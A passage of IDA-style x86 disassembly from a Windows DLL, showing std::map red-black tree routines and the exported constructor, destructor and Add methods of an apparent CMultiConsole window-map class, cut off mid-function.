		cmp	[ecx+8], ebx
		jnz	short loc_6AF45A46
		cmp	byte ptr [edi+15h], 0
		jz	short loc_6AF459D5
		mov	edx, esi
		jmp	short loc_6AF459E7
; ---------------------------------------------------------------------------

loc_6AF459D5:				; CODE XREF: sub_6AF458FB+D4j
		mov	eax, [edi+8]
		mov	edx, edi
		jmp	short loc_6AF459E1
; ---------------------------------------------------------------------------

loc_6AF459DC:				; CODE XREF: sub_6AF458FB+EAj
		mov	edx, eax
		mov	eax, [edx+8]

loc_6AF459E1:				; CODE XREF: sub_6AF458FB+DFj
		cmp	byte ptr [eax+15h], 0
		jz	short loc_6AF459DC

loc_6AF459E7:				; CODE XREF: sub_6AF458FB+D8j
		mov	[ecx+8], edx
		jmp	short loc_6AF45A46
; ---------------------------------------------------------------------------

loc_6AF459EC:				; CODE XREF: sub_6AF458FB+79j
		mov	[ecx+4], eax
		mov	ecx, [ebx]
		mov	[eax], ecx
		cmp	eax, [ebx+8]
		jnz	short loc_6AF459FC
		mov	esi, eax
		jmp	short loc_6AF45A16
; ---------------------------------------------------------------------------

loc_6AF459FC:				; CODE XREF: sub_6AF458FB+FBj
		cmp	byte ptr [edi+15h], 0
		mov	esi, [eax+4]
		jnz	short loc_6AF45A08
		mov	[edi+4], esi

loc_6AF45A08:				; CODE XREF: sub_6AF458FB+108j
		mov	[esi], edi
		mov	ecx, [ebx+8]
		mov	[eax+8], ecx
		mov	ecx, [ebx+8]
		mov	[ecx+4], eax

loc_6AF45A16:				; CODE XREF: sub_6AF458FB+FFj
		mov	ecx, [ebp+var_10]
		mov	ecx, [ecx+4]
		cmp	[ecx+4], ebx
		jnz	short loc_6AF45A26
		mov	[ecx+4], eax
		jmp	short loc_6AF45A34
; ---------------------------------------------------------------------------

loc_6AF45A26:				; CODE XREF: sub_6AF458FB+124j
		mov	ecx, [ebx+4]
		cmp	[ecx], ebx
		jnz	short loc_6AF45A31
		mov	[ecx], eax
		jmp	short loc_6AF45A34
; ---------------------------------------------------------------------------

loc_6AF45A31:				; CODE XREF: sub_6AF458FB+130j
		mov	[ecx+8], eax

loc_6AF45A34:				; CODE XREF: sub_6AF458FB+129j
					; sub_6AF458FB+134j
		mov	ecx, [ebx+4]
		mov	[eax+4], ecx
		mov	dl, [ebx+14h]
		mov	cl, [eax+14h]
		mov	[eax+14h], dl
		mov	[ebx+14h], cl

loc_6AF45A46:				; CODE XREF: sub_6AF458FB+CEj
					; sub_6AF458FB+EFj
		cmp	byte ptr [ebx+14h], 1
		jnz	loc_6AF45B53
		jmp	loc_6AF45B07
; ---------------------------------------------------------------------------

loc_6AF45A55:				; CODE XREF: sub_6AF458FB+215j
		cmp	byte ptr [edi+14h], 1
		jnz	loc_6AF45B4F
		mov	eax, [esi]
		cmp	edi, eax
		jnz	short loc_6AF45AD1
		mov	eax, [esi+8]
		cmp	byte ptr [eax+14h], 0
		jnz	short loc_6AF45A7F
		mov	byte ptr [eax+14h], 1
		push	esi
		mov	byte ptr [esi+14h], 0
		call	sub_6AF45809
		mov	eax, [esi+8]

loc_6AF45A7F:				; CODE XREF: sub_6AF458FB+171j
		cmp	byte ptr [eax+15h], 0
		jnz	short loc_6AF45B02
		mov	ecx, [eax]
		cmp	byte ptr [ecx+14h], 1
		jnz	short loc_6AF45A96
		mov	ecx, [eax+8]
		cmp	byte ptr [ecx+14h], 1
		jz	short loc_6AF45AFE

loc_6AF45A96:				; CODE XREF: sub_6AF458FB+190j
		mov	ecx, [eax+8]
		cmp	byte ptr [ecx+14h], 1
		jnz	short loc_6AF45AB5
		mov	ecx, [eax]
		mov	byte ptr [ecx+14h], 1
		mov	ecx, [ebp+var_10]
		push	eax
		mov	byte ptr [eax+14h], 0
		call	sub_6AF316D5
		mov	eax, [esi+8]

loc_6AF45AB5:				; CODE XREF: sub_6AF458FB+1A2j
		mov	cl, [esi+14h]
		mov	[eax+14h], cl
		mov	ecx, [ebp+var_10]
		mov	byte ptr [esi+14h], 1
		mov	eax, [eax+8]
		push	esi
		mov	byte ptr [eax+14h], 1
		call	sub_6AF45809
		jmp	short loc_6AF45B4F
; ---------------------------------------------------------------------------

loc_6AF45AD1:				; CODE XREF: sub_6AF458FB+168j
		cmp	byte ptr [eax+14h], 0
		jnz	short loc_6AF45AE7
		mov	byte ptr [eax+14h], 1
		push	esi
		mov	byte ptr [esi+14h], 0
		call	sub_6AF316D5
		mov	eax, [esi]

loc_6AF45AE7:				; CODE XREF: sub_6AF458FB+1DAj
		cmp	byte ptr [eax+15h], 0
		jnz	short loc_6AF45B02
		mov	ecx, [eax+8]
		cmp	byte ptr [ecx+14h], 1
		jnz	short loc_6AF45B18
		mov	ecx, [eax]
		cmp	byte ptr [ecx+14h], 1
		jnz	short loc_6AF45B18

loc_6AF45AFE:				; CODE XREF: sub_6AF458FB+199j
		mov	byte ptr [eax+14h], 0

loc_6AF45B02:				; CODE XREF: sub_6AF458FB+188j
					; sub_6AF458FB+1F0j
		mov	edi, esi
		mov	esi, [esi+4]

loc_6AF45B07:				; CODE XREF: sub_6AF458FB+155j
		mov	ecx, [ebp+var_10]
		mov	eax, [ecx+4]
		cmp	edi, [eax+4]
		jnz	loc_6AF45A55
		jmp	short loc_6AF45B4F
; ---------------------------------------------------------------------------

loc_6AF45B18:				; CODE XREF: sub_6AF458FB+1F9j
					; sub_6AF458FB+201j
		mov	ecx, [eax]
		cmp	byte ptr [ecx+14h], 1
		jnz	short loc_6AF45B36
		mov	ecx, [eax+8]
		mov	byte ptr [ecx+14h], 1
		mov	ecx, [ebp+var_10]
		push	eax
		mov	byte ptr [eax+14h], 0
		call	sub_6AF45809
		mov	eax, [esi]

loc_6AF45B36:				; CODE XREF: sub_6AF458FB+223j
		mov	cl, [esi+14h]
		mov	[eax+14h], cl
		mov	ecx, [ebp+var_10]
		mov	byte ptr [esi+14h], 1
		mov	eax, [eax]
		push	esi
		mov	byte ptr [eax+14h], 1
		call	sub_6AF316D5

loc_6AF45B4F:				; CODE XREF: sub_6AF458FB+15Ej
					; sub_6AF458FB+1D4j ...
		mov	byte ptr [edi+14h], 1

loc_6AF45B53:				; CODE XREF: sub_6AF458FB+14Fj
		push	ebx		; void *
		call	??3@YAXPAX@Z	; operator delete(void *)
		pop	ecx
		mov	ecx, [ebp+var_10]
		mov	eax, [ecx+8]
		test	eax, eax
		pop	edi
		pop	esi
		pop	ebx
		jbe	short loc_6AF45B6B
		dec	eax
		mov	[ecx+8], eax

loc_6AF45B6B:				; CODE XREF: sub_6AF458FB+26Aj
		mov	ecx, [ebp+arg_4]
		mov	eax, [ebp+arg_0]
		mov	[eax], ecx
		mov	ecx, [ebp+var_C]
		mov	large fs:0, ecx
		leave
		retn	8
sub_6AF458FB	endp


; =============== S U B	R O U T	I N E =======================================

; Attributes: bp-based frame

sub_6AF45B81	proc near		; CODE XREF: Ordinal904+38p
					; Ordinal905+4Fp ...

var_4		= dword	ptr -4
arg_0		= dword	ptr  8
arg_4		= dword	ptr  0Ch

		push	ebp
		mov	ebp, esp
		push	ecx
		push	esi
		push	edi
		mov	edi, [ebp+arg_4]
		push	edi
		mov	esi, ecx
		call	sub_6AF4584B
		mov	esi, [esi+4]
		cmp	eax, esi
		mov	[ebp+arg_4], eax
		jz	short loc_6AF45BA8
		mov	ecx, [edi]
		cmp	ecx, [eax+0Ch]
		jb	short loc_6AF45BA8
		lea	eax, [ebp+arg_4]
		jmp	short loc_6AF45BAE
; ---------------------------------------------------------------------------

loc_6AF45BA8:				; CODE XREF: sub_6AF45B81+19j
					; sub_6AF45B81+20j
		mov	[ebp+var_4], esi
		lea	eax, [ebp+var_4]

loc_6AF45BAE:				; CODE XREF: sub_6AF45B81+25j
		mov	ecx, [eax]
		mov	eax, [ebp+arg_0]
		pop	edi
		mov	[eax], ecx
		pop	esi
		leave
		retn	8
sub_6AF45B81	endp


; =============== S U B	R O U T	I N E =======================================

; Attributes: bp-based frame

; int __stdcall	sub_6AF45BBB(int, void *, int)
sub_6AF45BBB	proc near		; CODE XREF: sub_6AF45E91+12p

var_4		= dword	ptr -4
arg_0		= dword	ptr  8
arg_4		= dword	ptr  0Ch
arg_8		= dword	ptr  10h

		push	ebp
		mov	ebp, esp
		push	ecx
		push	esi
		mov	esi, ecx
		mov	eax, [esi+4]
		mov	ecx, [ebp+arg_4]
		cmp	ecx, [eax]
		jnz	short loc_6AF45BDF
		cmp	[ebp+arg_8], eax
		jnz	short loc_6AF45BDF
		mov	ecx, esi
		call	sub_6AF458A6
		mov	eax, [esi+4]
		mov	ecx, [eax]
		jmp	short loc_6AF45C04
; ---------------------------------------------------------------------------

loc_6AF45BDF:				; CODE XREF: sub_6AF45BBB+Fj
					; sub_6AF45BBB+14j
		cmp	ecx, [ebp+arg_8]
		jz	short loc_6AF45C04
		push	edi

loc_6AF45BE5:				; CODE XREF: sub_6AF45BBB+46j
		mov	edi, ecx
		lea	ecx, [ebp+arg_4]
		call	sub_6AF31681
		push	edi		; void *
		lea	eax, [ebp+var_4]
		push	eax		; int
		mov	ecx, esi
		call	sub_6AF458FB
		mov	ecx, [ebp+arg_4]
		cmp	ecx, [ebp+arg_8]
		jnz	short loc_6AF45BE5
		pop	edi

loc_6AF45C04:				; CODE XREF: sub_6AF45BBB+22j
					; sub_6AF45BBB+27j
		mov	eax, [ebp+arg_0]
		mov	[eax], ecx
		pop	esi
		leave
		retn	0Ch
sub_6AF45BBB	endp


; =============== S U B	R O U T	I N E =======================================


sub_6AF45C0E	proc near		; CODE XREF: Ordinal138+20p
					; Ordinal901+26p
		push	esi
		mov	esi, ecx
		call	sub_6AF31827
		lea	ecx, [esi+4]
		mov	[ecx], eax
		mov	byte ptr [eax+15h], 1
		mov	eax, [ecx]
		mov	[eax+4], eax
		mov	eax, [ecx]
		mov	[eax], eax
		mov	ecx, [ecx]
		mov	[ecx+8], ecx
		and	dword ptr [esi+8], 0
		pop	esi
		retn
sub_6AF45C0E	endp


; =============== S U B	R O U T	I N E =======================================

; Attributes: bp-based frame

sub_6AF45C33	proc near		; CODE XREF: sub_6AF45EBC+71p
					; sub_6AF45F4D+19p ...

var_50		= dword	ptr -50h
var_28		= byte ptr -28h
var_C		= dword	ptr -0Ch
var_4		= dword	ptr -4
arg_0		= dword	ptr  8
arg_4		= byte ptr  0Ch
arg_8		= dword	ptr  10h
arg_C		= dword	ptr  14h

		mov	eax, offset unknown_libname_91 ; Microsoft VisualC 2-10/net runtime
		call	__EH_prolog
		sub	esp, 44h
		push	ebx
		push	esi
		push	edi
		mov	edi, ecx
		cmp	dword ptr [edi+8], 1FFFFFFEh
		jb	short loc_6AF45C81
		push	offset aMapSetTTooLong ; "map/set<T> too long"
		lea	ecx, [ebp+var_28]
		call	ds:??0?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@QAE@PBD@Z ; std::basic_string<char,std::char_traits<char>,std::allocator<char>>::basic_string<char,std::char_traits<char>,std::allocator<char>>(char	const *)
		and	[ebp+var_4], 0
		lea	eax, [ebp+var_28]
		push	eax
		lea	ecx, [ebp+var_50]
		call	sub_6AF3136A
		push	offset dword_6AF61E98
		lea	eax, [ebp+var_50]
		push	eax
		mov	[ebp+var_50], offset off_6AF54898
		call	_CxxThrowException
; ---------------------------------------------------------------------------

loc_6AF45C81:				; CODE XREF: sub_6AF45C33+19j
		mov	eax, [edi+4]
		mov	esi, [ebp+arg_8]
		push	0
		push	[ebp+arg_C]
		mov	ecx, edi
		push	eax
		push	esi
		push	eax
		call	sub_6AF458CC
		inc	dword ptr [edi+8]
		mov	ebx, eax
		mov	eax, [edi+4]
		cmp	esi, eax
		jnz	short loc_6AF45CAF
		mov	[eax+4], ebx
		mov	eax, [edi+4]
		mov	[eax], ebx
		mov	eax, [edi+4]
		jmp	short loc_6AF45CCD
; ---------------------------------------------------------------------------

loc_6AF45CAF:				; CODE XREF: sub_6AF45C33+6Dj
		cmp	[ebp+arg_4], 0
		jz	short loc_6AF45CC2
		mov	[esi], ebx
		mov	eax, [edi+4]
		cmp	esi, [eax]
		jnz	short loc_6AF45CD0
		mov	[eax], ebx
		jmp	short loc_6AF45CD0
; ---------------------------------------------------------------------------

loc_6AF45CC2:				; CODE XREF: sub_6AF45C33+80j
		mov	[esi+8], ebx
		mov	eax, [edi+4]
		cmp	esi, [eax+8]
		jnz	short loc_6AF45CD0

loc_6AF45CCD:				; CODE XREF: sub_6AF45C33+7Aj
		mov	[eax+8], ebx

loc_6AF45CD0:				; CODE XREF: sub_6AF45C33+89j
					; sub_6AF45C33+8Dj ...
		mov	esi, ebx
		lea	eax, [ebx+4]
		jmp	loc_6AF45D6F
; ---------------------------------------------------------------------------

loc_6AF45CDA:				; CODE XREF: sub_6AF45C33+142j
		mov	ecx, [eax]
		mov	edx, [ecx+4]
		mov	edx, [edx]
		cmp	ecx, edx
		jnz	short loc_6AF45D3A
		mov	edx, [ecx+4]
		mov	edx, [edx+8]
		cmp	byte ptr [edx+14h], 0
		jnz	short loc_6AF45D0B

loc_6AF45CF1:				; CODE XREF: sub_6AF45C33+10Bj
		mov	ecx, [eax]
		mov	byte ptr [ecx+14h], 1
		mov	byte ptr [edx+14h], 1
		mov	ecx, [eax]
		mov	ecx, [ecx+4]
		mov	byte ptr [ecx+14h], 0
		mov	eax, [eax]
		mov	esi, [eax+4]
		jmp	short loc_6AF45D6C
; ---------------------------------------------------------------------------

loc_6AF45D0B:				; CODE XREF: sub_6AF45C33+BCj
		cmp	esi, [ecx+8]
		jnz	short loc_6AF45D1A
		mov	esi, ecx
		push	esi
		mov	ecx, edi
		call	sub_6AF45809

loc_6AF45D1A:				; CODE XREF: sub_6AF45C33+DBj
		mov	eax, [esi+4]
		mov	byte ptr [eax+14h], 1
		mov	eax, [esi+4]
		mov	eax, [eax+4]
		mov	byte ptr [eax+14h], 0
		mov	eax, [esi+4]
		push	dword ptr [eax+4]
		mov	ecx, edi
		call	sub_6AF316D5
		jmp	short loc_6AF45D6C
; ---------------------------------------------------------------------------

loc_6AF45D3A:				; CODE XREF: sub_6AF45C33+B0j
		cmp	byte ptr [edx+14h], 0
		jz	short loc_6AF45CF1
		cmp	esi, [ecx]
		jnz	short loc_6AF45D4E
		mov	esi, ecx
		push	esi
		mov	ecx, edi
		call	sub_6AF316D5

loc_6AF45D4E:				; CODE XREF: sub_6AF45C33+10Fj
		mov	eax, [esi+4]
		mov	byte ptr [eax+14h], 1
		mov	eax, [esi+4]
		mov	eax, [eax+4]
		mov	byte ptr [eax+14h], 0
		mov	eax, [esi+4]
		push	dword ptr [eax+4]
		mov	ecx, edi
		call	sub_6AF45809

loc_6AF45D6C:				; CODE XREF: sub_6AF45C33+D6j
					; sub_6AF45C33+105j
		lea	eax, [esi+4]

loc_6AF45D6F:				; CODE XREF: sub_6AF45C33+A2j
		mov	ecx, [eax]
		cmp	byte ptr [ecx+14h], 0
		jz	loc_6AF45CDA
		mov	eax, [edi+4]
		mov	eax, [eax+4]
		mov	ecx, [ebp+var_C]
		mov	byte ptr [eax+14h], 1
		mov	eax, [ebp+arg_0]
		pop	edi
		mov	[eax], ebx
		pop	esi
		pop	ebx
		mov	large fs:0, ecx
		leave
		retn	10h
sub_6AF45C33	endp

; Exported entry 904.

; =============== S U B	R O U T	I N E =======================================

; Attributes: bp-based frame

		public Ordinal904
Ordinal904	proc near		; DATA XREF: .rdata:off_6AF66098o

var_1C		= byte ptr -1Ch
var_10		= dword	ptr -10h
var_C		= dword	ptr -0Ch
var_4		= dword	ptr -4
arg_0		= dword	ptr  8

		mov	eax, offset unknown_libname_92 ; Microsoft VisualC 2-10/net runtime
		call	__EH_prolog
		sub	esp, 10h
		push	esi
		push	edi
		mov	esi, ecx
		push	0
		push	0FFFFFFFFh
		lea	eax, [esi+174h]
		push	eax
		lea	ecx, [ebp+var_1C]
		call	Ordinal1228
		and	[ebp+var_4], 0
		lea	eax, [ebp+arg_0]
		push	eax
		lea	eax, [ebp+var_10]
		lea	edi, [esi+194h]
		push	eax
		mov	ecx, edi
		call	sub_6AF45B81
		mov	eax, [ebp+var_10]
		cmp	eax, [esi+198h]
		jnz	short loc_6AF45DF2
		push	offset aCmulticonsoleA ; "CMultiConsole::Add() : pos ==	m_WindowM"...
		call	sub_6AF3102E
		pop	ecx
		xor	esi, esi
		jmp	short loc_6AF45E01
; ---------------------------------------------------------------------------

loc_6AF45DF2:				; CODE XREF: Ordinal904+46j
		push	eax		; void *
		lea	eax, [ebp+arg_0]
		push	eax		; int
		mov	ecx, edi
		call	sub_6AF458FB
		xor	esi, esi
		inc	esi

loc_6AF45E01:				; CODE XREF: Ordinal904+55j
		lea	ecx, [ebp+var_1C]
		call	Ordinal1230
		mov	ecx, [ebp+var_C]
		pop	edi
		mov	eax, esi
		pop	esi
		mov	large fs:0, ecx
		leave
		retn	4
Ordinal904	endp

; Exported entry 905.

; =============== S U B	R O U T	I N E =======================================

; Attributes: bp-based frame

		public Ordinal905
Ordinal905	proc near		; DATA XREF: .rdata:6AF5CE40o
					; .rdata:6AF5DD70o ...

var_10		= byte ptr -10h
var_4		= dword	ptr -4
arg_0		= dword	ptr  8

		push	ebp
		mov	ebp, esp
		sub	esp, 10h
		push	esi
		push	edi
		mov	edi, [ebp+arg_0]
		cmp	dword ptr [edi], 0
		mov	esi, ecx
		jz	short loc_6AF45E8B
		test	byte ptr [edi+0Ch], 3
		jz	short loc_6AF45E3F
		cmp	word ptr [edi+6], 73h
		jnz	short loc_6AF45E3F
		mov	eax, [esi]
		call	dword ptr [eax+2Ch]

loc_6AF45E3F:				; CODE XREF: Ordinal905+16j
					; Ordinal905+1Dj
		push	0
		push	0FFFFFFFFh
		lea	eax, [esi+174h]
		push	eax
		lea	ecx, [ebp+var_10]
		call	Ordinal1228
		movzx	eax, word ptr [edi+6]
		or	eax, [edi+0Ch]
		lea	ecx, [esi+194h]
		mov	[ebp+arg_0], eax
		lea	eax, [ebp+arg_0]
		push	eax
		lea	eax, [ebp+var_4]
		push	eax
		call	sub_6AF45B81
		mov	eax, [ebp+var_4]
		cmp	eax, [esi+198h]
		jz	short loc_6AF45E83
		mov	ecx, [eax+10h]
		push	esi
		call	Ordinal514

loc_6AF45E83:				; CODE XREF: Ordinal905+5Dj
		lea	ecx, [ebp+var_10]
		call	Ordinal1230

loc_6AF45E8B:				; CODE XREF: Ordinal905+10j
		pop	edi
		pop	esi
		leave
		retn	4
Ordinal905	endp


; =============== S U B	R O U T	I N E =======================================


sub_6AF45E91	proc near		; CODE XREF: Ordinal902+26p

var_4		= dword	ptr -4

		push	ecx
		push	esi
		mov	esi, ecx
		mov	eax, [esi+4]
		mov	ecx, [eax]
		push	eax		; int
		push	ecx		; void *
		lea	eax, [esp+10h+var_4]
		push	eax		; int
		mov	ecx, esi
		call	sub_6AF45BBB
		push	dword ptr [esi+4] ; void *
		call	??3@YAXPAX@Z	; operator delete(void *)
		and	dword ptr [esi+4], 0
		and	dword ptr [esi+8], 0
		pop	ecx
		pop	esi
		pop	ecx
		retn
sub_6AF45E91	endp


; =============== S U B	R O U T	I N E =======================================

; Attributes: bp-based frame

sub_6AF45EBC	proc near		; CODE XREF: sub_6AF45F4D+C8p

var_4		= dword	ptr -4
arg_0		= dword	ptr  8
arg_4		= dword	ptr  0Ch

		push	ebp
		mov	ebp, esp
		push	ecx
		push	ebx
		mov	ebx, [ebp+arg_4]
		push	esi
		mov	esi, ecx
		mov	ecx, [esi+4]
		mov	eax, [ecx+4]
		cmp	byte ptr [eax+15h], 0
		push	edi
		mov	edi, ecx
		mov	byte ptr [ebp+var_4], 1
		jnz	short loc_6AF45EF8
		mov	ecx, [ebx]

loc_6AF45EDC:				; CODE XREF: sub_6AF45EBC+3Aj
		cmp	ecx, [eax+0Ch]
		mov	edi, eax
		setb	byte ptr [ebp+var_4]
		cmp	byte ptr [ebp+var_4], 0
		jz	short loc_6AF45EEF
		mov	eax, [eax]
		jmp	short loc_6AF45EF2
; ---------------------------------------------------------------------------

loc_6AF45EEF:				; CODE XREF: sub_6AF45EBC+2Dj
		mov	eax, [eax+8]

loc_6AF45EF2:				; CODE XREF: sub_6AF45EBC+31j
		cmp	byte ptr [eax+15h], 0
		jz	short loc_6AF45EDC

loc_6AF45EF8:				; CODE XREF: sub_6AF45EBC+1Cj
		cmp	byte ptr [ebp+var_4], 0
		mov	ecx, edi
		mov	[ebp+arg_4], ecx
		jz	short loc_6AF45F1B
		mov	eax, [esi+4]
		cmp	edi, [eax]
		jnz	short loc_6AF45F10
		push	ebx
		push	edi
		push	1
		jmp	short loc_6AF45F27
; ---------------------------------------------------------------------------

loc_6AF45F10:				; CODE XREF: sub_6AF45EBC+4Cj
		lea	ecx, [ebp+arg_4]
		call	sub_6AF315CE
		mov	ecx, [ebp+arg_4]

loc_6AF45F1B:				; CODE XREF: sub_6AF45EBC+45j
		mov	eax, [ecx+0Ch]
		cmp	eax, [ebx]
		jnb	short loc_6AF45F3D
		push	ebx
		push	edi
		push	[ebp+var_4]

loc_6AF45F27:				; CODE XREF: sub_6AF45EBC+52j
		lea	eax, [ebp+arg_4]
		push	eax
		mov	ecx, esi
		call	sub_6AF45C33
		mov	ecx, [eax]
		mov	eax, [ebp+arg_0]
		mov	byte ptr [eax+4], 1
		jmp	short loc_6AF45F44
; ---------------------------------------------------------------------------

loc_6AF45F3D:				; CODE XREF: sub_6AF45EBC+64j
		mov	eax, [ebp+arg_0]
		mov	byte ptr [eax+4], 0

loc_6AF45F44:				; CODE XREF: sub_6AF45EBC+7Fj
		pop	edi
		pop	esi
		mov	[eax], ecx
		pop	ebx
		leave
		retn	8
sub_6AF45EBC	endp


; =============== S U B	R O U T	I N E =======================================

; Attributes: bp-based frame

sub_6AF45F4D	proc near		; CODE XREF: sub_6AF46067+32p

var_8		= byte ptr -8
arg_0		= dword	ptr  8
arg_4		= dword	ptr  0Ch
arg_8		= dword	ptr  10h

		push	ebp
		mov	ebp, esp
		push	ecx
		push	ecx
		push	ebx
		mov	ebx, ecx
		cmp	dword ptr [ebx+8], 0
		jnz	short loc_6AF45F73
		push	[ebp+arg_8]
		push	dword ptr [ebx+4]
		push	1
		push	[ebp+arg_0]
		call	sub_6AF45C33
		mov	eax, [ebp+arg_0]
		jmp	loc_6AF46023
; ---------------------------------------------------------------------------

loc_6AF45F73:				; CODE XREF: sub_6AF45F4D+Cj
		mov	eax, [ebx+4]
		push	esi
		mov	esi, [ebp+arg_4]
		cmp	esi, [eax]
		push	edi
		mov	edi, [ebp+arg_8]
		jnz	short loc_6AF45F91
		mov	eax, [edi]
		cmp	eax, [esi+0Ch]
		jnb	loc_6AF4600E
		push	edi

loc_6AF45F8E:				; CODE XREF: sub_6AF45F4D+7Cj
		push	esi
		jmp	short loc_6AF45FFD
; ---------------------------------------------------------------------------

loc_6AF45F91:				; CODE XREF: sub_6AF45F4D+33j
		cmp	esi, eax
		jnz	short loc_6AF45FA5
		mov	eax, [eax+8]
		mov	ecx, [eax+0Ch]
		cmp	ecx, [edi]
		jnb	short loc_6AF4600E
		push	edi
		push	eax

loc_6AF45FA1:				; CODE XREF: sub_6AF45F4D+7Fj
					; sub_6AF45F4D+ADj
		push	0
		jmp	short loc_6AF45FFF
; ---------------------------------------------------------------------------

loc_6AF45FA5:				; CODE XREF: sub_6AF45F4D+46j
		mov	eax, [edi]
		cmp	eax, [esi+0Ch]
		jnb	short loc_6AF45FCE
		lea	ecx, [ebp+arg_8]
		mov	[ebp+arg_8], esi
		call	sub_6AF315CE
		mov	ecx, [ebp+arg_8]
		mov	eax, [edi]
		cmp	[ecx+0Ch], eax
		jnb	short loc_6AF45FCE
		mov	eax, [ecx+8]
		cmp	byte ptr [eax+15h], 0
		push	edi
		jz	short loc_6AF45F8E
		push	ecx
		jmp	short loc_6AF45FA1
; ---------------------------------------------------------------------------

loc_6AF45FCE:				; CODE XREF: sub_6AF45F4D+5Dj
					; sub_6AF45F4D+72j
		mov	eax, [edi]
		cmp	[esi+0Ch], eax
		jnb	short loc_6AF4600E
		lea	ecx, [ebp+arg_8]
		mov	[ebp+arg_8], esi
		call	sub_6AF31681
		mov	ecx, [ebp+arg_8]
		cmp	ecx, [ebx+4]
		jz	short loc_6AF45FEF
		mov	eax, [edi]
		cmp	eax, [ecx+0Ch]
		jnb	short loc_6AF4600E

loc_6AF45FEF:				; CODE XREF: sub_6AF45F4D+99j
		mov	eax, [esi+8]
		cmp	byte ptr [eax+15h], 0
		push	edi
		jz	short loc_6AF45FFC
		push	esi
		jmp	short loc_6AF45FA1
; ---------------------------------------------------------------------------

loc_6AF45FFC:				; CODE XREF: sub_6AF45F4D+AAj
		push	ecx

loc_6AF45FFD:				; CODE XREF: sub_6AF45F4D+42j
		push	1

loc_6AF45FFF:				; CODE XREF: sub_6AF45F4D+56j
		push	[ebp+arg_0]
		mov	ecx, ebx
		call	sub_6AF45C33
		mov	eax, [ebp+arg_0]
		jmp	short loc_6AF46021
; ---------------------------------------------------------------------------

loc_6AF4600E:				; CODE XREF: sub_6AF45F4D+3Aj
					; sub_6AF45F4D+50j ...
		push	edi
		lea	eax, [ebp+var_8]
		push	eax
		mov	ecx, ebx
		call	sub_6AF45EBC
		mov	ecx, [eax]
		mov	eax, [ebp+arg_0]
		mov	[eax], ecx

loc_6AF46021:				; CODE XREF: sub_6AF45F4D+BFj
		pop	edi
		pop	esi

loc_6AF46023:				; CODE XREF: sub_6AF45F4D+21j
		pop	ebx
		leave
		retn	0Ch
sub_6AF45F4D	endp

; Exported entry 902.

; =============== S U B	R O U T	I N E =======================================

; Attributes: bp-based frame

		public Ordinal902
Ordinal902	proc near		; CODE XREF: sub_6AF460E3+3p
					; Ordinal1051+6j
					; DATA XREF: ...

var_10		= dword	ptr -10h
var_C		= dword	ptr -0Ch
var_4		= dword	ptr -4

		mov	eax, offset unknown_libname_93 ; Microsoft VisualC 2-10/net runtime
		call	__EH_prolog
		push	ecx
		push	esi
		mov	esi, ecx
		mov	[ebp+var_10], esi
		mov	dword ptr [esi], offset	off_6AF5CE28
		and	[ebp+var_4], 0
		call	Ordinal481
		lea	ecx, [esi+194h]
		call	sub_6AF45E91
		mov	ecx, esi
		call	Ordinal478
		mov	ecx, [ebp+var_C]
		pop	esi
		mov	large fs:0, ecx
		leave
		retn
Ordinal902	endp


; =============== S U B	R O U T	I N E =======================================

; Attributes: bp-based frame

sub_6AF46067	proc near		; CODE XREF: Ordinal903+7Ap

var_8		= dword	ptr -8
var_4		= dword	ptr -4
arg_0		= dword	ptr  8

		push	ebp
		mov	ebp, esp
		push	ecx
		push	ecx
		push	esi
		mov	esi, [ebp+arg_0]
		push	edi
		push	esi
		mov	edi, ecx
		call	sub_6AF4584B
		cmp	eax, [edi+4]
		jz	short loc_6AF46085
		mov	ecx, [esi]
		cmp	ecx, [eax+0Ch]
		jnb	short loc_6AF460A0

loc_6AF46085:				; CODE XREF: sub_6AF46067+15j
		mov	ecx, [esi]
		and	[ebp+var_4], 0
		mov	[ebp+var_8], ecx
		lea	ecx, [ebp+var_8]
		push	ecx
		push	eax
		lea	eax, [ebp+arg_0]
		push	eax
		mov	ecx, edi
		call	sub_6AF45F4D
		mov	eax, [eax]

loc_6AF460A0:				; CODE XREF: sub_6AF46067+1Cj
		pop	edi
		add	eax, 10h
		pop	esi
		leave
		retn	4
sub_6AF46067	endp

; Exported entry 901.

; =============== S U B	R O U T	I N E =======================================

; Attributes: bp-based frame

		public Ordinal901
Ordinal901	proc near		; CODE XREF: Ordinal1050+3p
					; DATA XREF: .rdata:off_6AF66098o

var_10		= dword	ptr -10h
var_C		= dword	ptr -0Ch
var_4		= dword	ptr -4

		mov	eax, offset unknown_libname_93 ; Microsoft VisualC 2-10/net runtime
		call	__EH_prolog
		push	ecx
		push	esi
		mov	esi, ecx
		mov	[ebp+var_10], esi
		call	Ordinal477
		and	[ebp+var_4], 0
		lea	ecx, [esi+194h]
		mov	dword ptr [esi], offset	off_6AF5CE28
		call	sub_6AF45C0E
		mov	ecx, [ebp+var_C]
		mov	eax, esi
		pop	esi
		mov	large fs:0, ecx
		leave
		retn
Ordinal901	endp


; =============== S U B	R O U T	I N E =======================================


; int __thiscall sub_6AF460E3(void *, char)
sub_6AF460E3	proc near		; DATA XREF: .rdata:off_6AF5CE28o

arg_0		= byte ptr  4

		push	esi
		mov	esi, ecx
		call	Ordinal902
		test	[esp+4+arg_0], 1
		jz	short loc_6AF460F9
		push	esi		; void *
		call	??3@YAXPAX@Z	; operator delete(void *)
		pop	ecx

loc_6AF460F9:				; CODE XREF: sub_6AF460E3+Dj
		mov	eax, esi
		pop	esi
		retn	4
sub_6AF460E3	endp

; Exported entry 903.

; =============== S U B	R O U T	I N E =======================================

; Attributes: bp-based frame

		public Ordinal903
Ordinal903	proc near		; DATA XREF: .rdata:off_6AF66098o

var_58		= byte ptr -58h
var_48		= byte ptr -48h
var_28		= dword	ptr -28h
var_14		= dword	ptr -14h
var_10		= dword	ptr -10h
var_C		= dword	ptr -0Ch
var_4		= dword	ptr -4
arg_0		= byte ptr  8
arg_4		= dword	ptr  0Ch

		mov	eax, offset unknown_libname_94 ; Microsoft VisualC 2-10/net runtime
		call	__EH_prolog
		sub	esp, 4Ch
		mov	eax, ___security_cookie
		push	ebx
		push	esi
		push	edi
		mov	[ebp+var_10], esp
		mov	esi, ecx
		push	0
		mov	[ebp+var_14], eax
		push	0FFFFFFFFh
		lea	eax, [esi+174h]
		push	eax
		lea	ecx, [ebp+var_58]
		call	Ordinal1228
		and	[ebp+var_4], 0
		lea	eax, [ebp+arg_0]
		push	eax
		lea	eax, [ebp+var_28]
		lea	edi, [esi+194h]
		push	eax
		mov	ecx, edi
		call	sub_6AF45B81
		mov	esi, [esi+198h]
		cmp	[ebp+var_28], esi
		jz	short loc_6AF46162
